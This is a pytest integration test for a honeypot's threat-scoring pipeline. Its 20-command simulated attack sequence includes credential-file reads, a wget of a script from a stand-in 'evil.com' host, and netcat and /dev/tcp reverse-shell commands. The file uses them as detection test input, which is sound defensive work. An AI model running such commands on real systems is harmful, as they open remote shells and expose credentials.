"""Integration test: 20-command session covering all 4 threat levels.

Verifies that the full pipeline (ResponseEngine -> ThreatScorer -> cowrie_hook)
produces correct threat scores, level transitions, populated ThreatDecisions,
and persona switch triggers at the right thresholds.

This test uses create_dispatcher() so the entire stack is exercised:
    command_parser -> command_handlers -> response_engine -> threat_scorer
"""
from __future__ import annotations

import asyncio
from typing import List, Tuple

import pytest

from honeypot.cowrie_hook import create_dispatcher
from honeypot.threat_scorer import CommandCategory, ThreatDecision, ThreatLevel


def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ---------------------------------------------------------------------------
# 20-command attack sequence designed to cross all 4 threat levels
# ---------------------------------------------------------------------------

ATTACK_SEQUENCE: List[Tuple[str, str]] = [
    # --- Phase 1: LOW (score 0-20) --- benign + light recon
    ("ls", "benign"),
    ("pwd", "benign"),
    ("whoami", "reconnaissance"),
    ("id", "reconnaissance"),
    ("uname -a", "reconnaissance"),
    ("hostname", "reconnaissance"),
    ("df -h", "reconnaissance"),
    # --- Phase 2: MEDIUM (score 21-50) --- exploration
    ("cat /etc/passwd", "exploration"),
    ("ps aux", "exploration"),
    ("netstat -tulpn", "reconnaissance"),
    ("cat /var/log/auth.log", "exploration"),
    ("find / -writable", "exploration"),
    # --- Phase 3: HIGH (score 51-80) --- privilege escalation
    ("sudo -l", "privilege_escalation"),
    ("cat /etc/shadow", "privilege_escalation"),
    ("find / -perm -4000", "privilege_escalation"),
    # --- Phase 4: CRITICAL (score 81-100) --- exfiltration
    ("wget http://evil.com/shell.sh", "exfiltration"),
    ("chmod +x shell.sh", "privilege_escalation"),
    ("bash -i", "exfiltration"),
    ("/dev/tcp/10.0.0.1/4444", "exfiltration"),
    ("nc -e /bin/sh 10.0.0.1 4444", "exfiltration"),
]


class TestTwentyCommandSession:
    """Full 20-command integration across all 4 threat levels."""

    def test_score_monotonically_increases(self):
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")
        prev_score = 0

        for cmd, _ in ATTACK_SEQUENCE:
            disp.dispatch(cmd)
            assert disp._threat_score >= prev_score, (
                f"Score decreased after '{cmd}': {disp._threat_score} < {prev_score}"
            )
            prev_score = disp._threat_score

    def test_all_four_levels_reached(self):
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")
        levels_seen: set[str] = set()

        for cmd, _ in ATTACK_SEQUENCE:
            disp.dispatch(cmd)
            history = disp.session.command_history
            if history:
                last = history[-1]
                score = disp._threat_score
                if score <= 20:
                    levels_seen.add("low")
                elif score <= 50:
                    levels_seen.add("medium")
                elif score <= 80:
                    levels_seen.add("high")
                else:
                    levels_seen.add("critical")

        assert "low" in levels_seen, f"LOW never reached, levels: {levels_seen}"
        assert "medium" in levels_seen, f"MEDIUM never reached, levels: {levels_seen}"
        assert "high" in levels_seen, f"HIGH never reached, levels: {levels_seen}"
        assert "critical" in levels_seen, f"CRITICAL never reached, levels: {levels_seen}"

    def test_threat_decision_populated_every_command(self):
        """Every command through handle_command should produce a ThreatDecision."""
        from honeypot.fakefs import FakeFS
        from honeypot.response_engine import ResponseEngine
        from dictionary.command_handlers import SimpleSession

        fs = FakeFS("generic_linux")
        engine = ResponseEngine(fs)
        sess = SimpleSession(
            current_directory="/root",
            current_user="root",
            environment=fs.get_environment("root"),
        )

        for cmd, expected_cat in ATTACK_SEQUENCE:
            response, source, decision = _run(engine.handle_command(cmd, sess))
            assert isinstance(decision, ThreatDecision), (
                f"Command '{cmd}' returned {type(decision)} instead of ThreatDecision"
            )
            assert decision.command_raw == cmd.strip()
            assert isinstance(decision.command_category, CommandCategory)
            assert isinstance(decision.threat_level, ThreatLevel)
            assert decision.score_delta >= 0
            assert 0 <= decision.new_total_score <= 100

    def test_level_transitions_at_thresholds(self):
        """Verify transitions happen at the documented boundaries."""
        from honeypot.fakefs import FakeFS
        from honeypot.response_engine import ResponseEngine
        from dictionary.command_handlers import SimpleSession

        fs = FakeFS("generic_linux")
        engine = ResponseEngine(fs)
        sess = SimpleSession(
            current_directory="/root",
            current_user="root",
            environment=fs.get_environment("root"),
        )

        transitions: list[dict] = []

        for cmd, _ in ATTACK_SEQUENCE:
            _, _, decision = _run(engine.handle_command(cmd, sess))

            sess.threat_score = decision.new_total_score
            for p in decision.patterns_detected:
                sess.patterns_detected.add(p)

            sess.command_history.append({
                "raw": cmd,
                "output": "",
                "source": "fast_path",
                "cwd": sess.current_directory,
                "category": decision.command_category.value,
                "score_delta": decision.score_delta,
            })

            transitions.append({
                "cmd": cmd,
                "score": decision.new_total_score,
                "level": decision.threat_level.value,
                "delta": decision.score_delta,
            })

        scores = [t["score"] for t in transitions]
        levels = [t["level"] for t in transitions]

        for t in transitions:
            if t["score"] <= 20:
                assert t["level"] == "low", f"Score {t['score']} should be LOW, got {t['level']}"
            elif t["score"] <= 50:
                assert t["level"] == "medium", f"Score {t['score']} should be MEDIUM, got {t['level']}"
            elif t["score"] <= 80:
                assert t["level"] == "high", f"Score {t['score']} should be HIGH, got {t['level']}"
            else:
                assert t["level"] == "critical", f"Score {t['score']} should be CRITICAL, got {t['level']}"

        assert scores[-1] == 100, f"Expected max score 100, got {scores[-1]}"

    def test_persona_switch_triggered_during_session(self):
        """At least one persona switch should fire during the 20-command sequence."""
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")
        switch_triggered = False

        for cmd, _ in ATTACK_SEQUENCE:
            disp.dispatch(cmd)
            if disp._persona_switch_count > 0:
                switch_triggered = True

        assert switch_triggered, "No persona switch triggered during 20-command attack"

    def test_category_distribution(self):
        """The 20-command sequence should hit at least 4 different categories."""
        from honeypot.fakefs import FakeFS
        from honeypot.response_engine import ResponseEngine
        from dictionary.command_handlers import SimpleSession

        fs = FakeFS("generic_linux")
        engine = ResponseEngine(fs)
        sess = SimpleSession(
            current_directory="/root",
            current_user="root",
            environment=fs.get_environment("root"),
        )

        categories: set[str] = set()
        for cmd, _ in ATTACK_SEQUENCE:
            _, _, decision = _run(engine.handle_command(cmd, sess))
            categories.add(decision.command_category.value)
            sess.command_history.append({
                "raw": cmd, "output": "", "source": "fast_path",
                "cwd": "/root",
                "category": decision.command_category.value,
                "score_delta": decision.score_delta,
            })

        assert len(categories) >= 4, f"Only {len(categories)} categories: {categories}"
        assert "benign" in categories
        assert "reconnaissance" in categories
        assert "exploration" in categories

    def test_cowrie_hook_logs_threat_data(self):
        """Verify that dispatch_async enriches command_history with threat fields."""
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")

        for cmd, _ in ATTACK_SEQUENCE[:5]:
            disp.dispatch(cmd)

        for entry in disp.session.command_history:
            assert "category" in entry, f"Missing 'category' in {entry}"
            assert "score_delta" in entry, f"Missing 'score_delta' in {entry}"

    def test_patterns_accumulate_in_session(self):
        """Multi-command patterns should fire and accumulate in session state."""
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")

        for cmd, _ in ATTACK_SEQUENCE:
            disp.dispatch(cmd)

        patterns = disp.session.patterns_detected
        assert len(patterns) > 0, "No patterns detected across 20 attack commands"

    def test_score_never_exceeds_100(self):
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")

        for cmd, _ in ATTACK_SEQUENCE:
            disp.dispatch(cmd)
            assert disp._threat_score <= 100, (
                f"Score exceeded 100 after '{cmd}': {disp._threat_score}"
            )

    def test_empty_and_benign_commands_dont_inflate(self):
        """Running only benign commands should keep score at 0."""
        disp = create_dispatcher(persona_name="generic_linux", login_user="root")
        benign_cmds = ["ls", "pwd", "cd /tmp", "clear", "echo hello", "date",
                       "touch test.txt", "mkdir foo", "rm foo"]
        for cmd in benign_cmds:
            disp.dispatch(cmd)
        assert disp._threat_score == 0, f"Benign-only score should be 0, got {disp._threat_score}"


class TestThreeTupleContract:
    """Verify the 3-tuple return contract of handle_command."""

    @pytest.fixture
    def engine_sess(self):
        from honeypot.fakefs import FakeFS
        from honeypot.response_engine import ResponseEngine
        from dictionary.command_handlers import SimpleSession

        fs = FakeFS("generic_linux")
        engine = ResponseEngine(fs)
        sess = SimpleSession(
            current_directory="/root",
            current_user="root",
            environment=fs.get_environment("root"),
        )
        return engine, sess

    def test_returns_three_values(self, engine_sess):
        engine, sess = engine_sess
        result = _run(engine.handle_command("ls", sess))
        assert len(result) == 3

    def test_first_is_string(self, engine_sess):
        engine, sess = engine_sess
        response, _, _ = _run(engine.handle_command("whoami", sess))
        assert isinstance(response, str)

    def test_second_is_source_string(self, engine_sess):
        engine, sess = engine_sess
        _, source, _ = _run(engine.handle_command("ls", sess))
        assert source in ("fast_path", "llm", "fallback")

    def test_third_is_threat_decision(self, engine_sess):
        engine, sess = engine_sess
        _, _, decision = _run(engine.handle_command("cat /etc/shadow", sess))
        assert isinstance(decision, ThreatDecision)
        assert decision.command_raw == "cat /etc/shadow"

    def test_empty_input_returns_benign_decision(self, engine_sess):
        engine, sess = engine_sess
        _, _, decision = _run(engine.handle_command("", sess))
        assert decision.command_category == CommandCategory.BENIGN
        assert decision.score_delta == 0

    def test_chained_command_returns_decision(self, engine_sess):
        engine, sess = engine_sess
        response, source, decision = _run(engine.handle_command("whoami; id", sess))
        assert isinstance(decision, ThreatDecision)
        assert decision.score_delta >= 0

    def test_piped_command_returns_decision(self, engine_sess):
        engine, sess = engine_sess
        _, _, decision = _run(engine.handle_command("ps aux | grep root", sess))
        assert isinstance(decision, ThreatDecision)

    def test_redirect_command_returns_decision(self, engine_sess):
        engine, sess = engine_sess
        response, _, decision = _run(engine.handle_command('echo test > /tmp/out', sess))
        assert response == ""
        assert isinstance(decision, ThreatDecision)
